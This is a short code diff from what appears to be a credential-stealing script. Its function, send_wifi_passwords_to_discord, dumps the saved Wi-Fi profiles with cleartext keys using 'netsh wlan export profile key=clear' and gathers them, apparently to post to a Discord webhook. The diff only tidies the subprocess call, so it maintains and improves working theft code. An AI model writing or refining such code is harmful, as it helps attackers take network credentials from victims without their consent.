@@ -262,9 +262,7 @@ def send_wifi_passwords_to_discord(webhook_url):
     with open("passwords.txt", "w") as f:
         f.write("Available Wi-Fi credentials on the machine:\n")
         f.close()
-    command = subprocess.run(
-        ["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True
-    ).stdout.decode()
+    command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True, text=True).stdout
     path = os.getcwd()
     wifi_files = []
     for filename in os.listdir(path):
